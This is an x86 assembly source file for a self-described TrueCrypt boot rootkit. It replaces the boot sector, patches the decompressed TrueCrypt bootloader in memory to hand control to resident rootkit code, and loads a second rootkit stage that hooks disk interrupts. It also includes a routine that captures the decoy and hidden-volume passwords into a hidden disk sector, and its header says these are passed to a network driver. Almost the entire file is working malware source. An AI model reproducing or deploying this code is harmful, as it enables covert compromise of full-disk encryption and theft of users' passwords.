;===============================================================
; ninja_boot.asm                  
;---------------------------------------------------------------
; truecrypt boot rootkit v 1.0
;
; armak00ni / last ninja labs
;===============================================================
;
; loads and decompresses truecrypt bootloader
; patches truecrypt bootloader
; hooks int 13h after the truecrypt volume is mounted
; added reentrance locking mechanism - since truecrypt calls   !
; an int 13h in its int 13h handler (!!)                       !
;
; passes truecrypt passwords to ndis.sys for special effects
;===============================================================

%define		PURPLE_SECTOR		32	; sector to store passwords
%define		K00N_ID				'k0'

BITS 16

org	7c00h

start:
	jmp		continue						; 0000
	; simulate purple_chain environment
	db	'k00n', 0							; 0003
	decoy_password_ptr	dw tc_decoy_password				; 0008
	hidden_password_ptr dw tc_hidden_password				; 000a
	
continue:
	cli             	;disable interrupts
	xor 	ax, ax
	mov 	ss, ax
	mov 	sp, 7c00h
	mov		si, sp
	sti             	;enable interrupts

	push	ax
	push	ax
	pop		ds
	pop		di
	
	mov		eax, dword [0x4c]
	mov		dword [cs:orig_int13], eax
	
	dec word [413h]    	;Memory less by 1K

	int 	12h			; memory into AX
	mov 	cl, 6       ; because memory is in K
	shl 	ax, cl
	mov 	es, ax    
	mov		word [cs:ninja_seg], ax
	mov 	cx, 512      
	push	cs
	pop		ds
	cld
	rep movsb      
	
; ----- load tc boot loader -----
	; Determine boot loader segment
	mov ax, 09000h
	mov es, ax

	; Clear BSS section
	xor al, al
	mov di, 0100h
	mov cx, 6effh
	rep stosb
	
	mov ax, es
	sub ax, 0800h	; Decompressor segment
	mov es, ax
	
	; Load decompressor
	mov cl, 2
	mov al, 4
	mov bx, 0100h
	call read_sectors

	; Load compressed boot loader
	mov bx, 0d00h
	mov cl, 6
	mov al, 039h
	call read_sectors

	; Set up decompressor segment
	mov ax, es
	mov ds, ax
	cli
	mov ss, ax
	mov sp, 08000h
	sti
	
	push dx
	
	; Decompress boot loader
	push 0d0ah			; Compressed data
	push 07a00h			; Output buffer size
	push 08100h			; Output buffer

	push cs
	push decompressor_ret
	push es
	push 0100h
	retf

decompressor_ret:
	add sp, 6
	pop dx

	
	; Restore boot sector segment
	push cs
	pop ds

	; ------------>>>> after bootloader decompression: patch it <<<<------------
	call	patch_bootloader
	
	; DH = boot sector flags
	mov dh, [07db7h]
	
	; Set up boot loader segment
	mov ax, es
	add ax, 0800h
	mov es, ax
	mov ds, ax
	cli
	mov ss, ax
	mov sp, 06ffch
	sti

	; Execute boot loader
	push es
	push 0100h
	retf
	
	; Read sectors of the first cylinder
read_sectors:
	mov ch, 0           ; Cylinder
	mov dh, 0           ; Head
						; DL = drive number passed from BIOS
	mov ah, 2
	; int 13h
	pushf	
	call far [cs:orig_int13]
	ret
	
; ======== interesting stuff comes here ========================================
; patch: overwrite: from tcb:1c5c:
patch_bin:
	mov ax, cs				; save the TC segment (0x9000)
	; jmp ninja_seg:patch_handler
	db 0eah
ninja_ofs dw ninja_boot - start
ninja_seg dw 0
PATCH_LEN equ $ - patch_bin ; == 7 bytes

; undo data of the patch:
restore_bin:
	db 0xc8, 0x04, 0x00, 0x00 	; enter 4,0
	db 0x56						; push si
	db 0x68, 0x50;,0x48			; push 0x4850
;	db 0xe8, 0x29, 0xf1			; call 0xd90
;	db 0x5b						; pop bx

patch_bootloader:
	pusha
	push	es

	; patch truecrypt boot
	push 	09000h
	pop		es
	mov		di, 0x1d5c
	
	mov		si, patch_bin
	mov		cx, PATCH_LEN
	rep		movsb	
	
	pop		es
	popa
	retn
	
ninja_boot:			; executed from resident part
	; setup an own stack
	cli
	mov		[cs:old_stack - start], sp
	mov		bx, ss
	mov		[cs:old_stack - start + 2], bx
	mov		bx, 9900
	mov		ss, bx
	mov		sp, 0x800-2
	sti
	
	push	es
	push	ds
	pusha
	
	
	; restore patch
	
	push	cs
	pop		ds
	mov		si, restore_bin - start ; since we org 0 in our resident ram copy
	
	mov		es, ax	; 9000h (passed from our patch)
	mov		di, 0x1d5c
	mov		cx, PATCH_LEN
	rep		movsb
	
; ========================= load rootkit (ninja_ebrk) ==========================
; (which will hook interrupts now, after the truecrypt mount ...)

load_ninja_ebrk:	; executed from resident part

	; copy truecrypt passwords	
	push	09800h
	pop		es
	;call	store_passwords_2_sector

	xor		bx, bx
	mov		cx, 0x28 + 1
	mov		dx, 0x80
	mov		ax, 0202
	; call	do_int13
	pushf	
	call far [cs:(orig_int13 - start)]
	
	 push	cs
	 push	return_here - start
	 push	0x9800
	 push	0
	 mov	ax, cs
	 retf

return_here:			
	
	popa
	pop		ds
	pop		es
	
	cli
	mov		sp, [cs:old_stack - start]
	mov		bx, [cs:old_stack - start + 2]
	mov		ss, bx
	sti

	push	0x9000
	push	0x1d5c
	retf


store_passwords_2_sector:
	; read purple sector into buffer
	cld

	mov 	ax, 0201h
	xor		bx, bx
	mov 	cx, PURPLE_SECTOR
	mov		dx, 80h
	pushf
	call far [cs:(orig_int13 - start)]
	
	cmp		word [es:0], K00N_ID
	je		.noinit

	; init purple sector
	mov		word [es:0], K00N_ID
	
	xor 	al, al
	mov		di, 2
	mov		cx, 4+40+4+40
	rep		stosb
	
.noinit:
	mov		ax, 09000h
	mov		ds, ax
	
	; is hidden?
	mov     bx, [ds:4B88h]
    mov     bl, [ds:bx+3D4h] ; bl: bool is_hidden
	
	; copy password
	mov		di, 2
	mov		si, 022h		; int len, char *tc_password
	xor		cx, cx
	mov		cl, 43
	
	cmp 	bl, 1
	jz 		.is_hidden
	jmp		.cont
	
.is_hidden:	
	add		di, 44
	
.cont:	
	rep		movsb
	xor		al, al
	stosb ; asciiZ	
	
	retn

; store sector
	mov 	ax, 0301h
	xor		bx, bx
	mov 	cx, PURPLE_SECTOR
	mov		dx, 80h
	; call orig int13
	pushf
	call far [cs:(orig_int13 - start)]
	
	; copy passwords
	push	es
	
	mov		di, tc_decoy_password_len - start
	xor		si, si
	push 	es
	pop 	ds
	push	cs
	pop		es
	mov 	cx, 4+40+4+40
	rep movsb
	
	pop		es
	retn

;do_int13:
;	pushf	
;	call far [cs:(orig_int13 - start)]
;	retn
	
old_stack	dd 0	
orig_int13	dw 0, 0
	
tc_decoy_password_len	dd	 0
tc_decoy_password		resb 40
tc_hidden_password_len  dd 0
tc_hidden_password		resb 40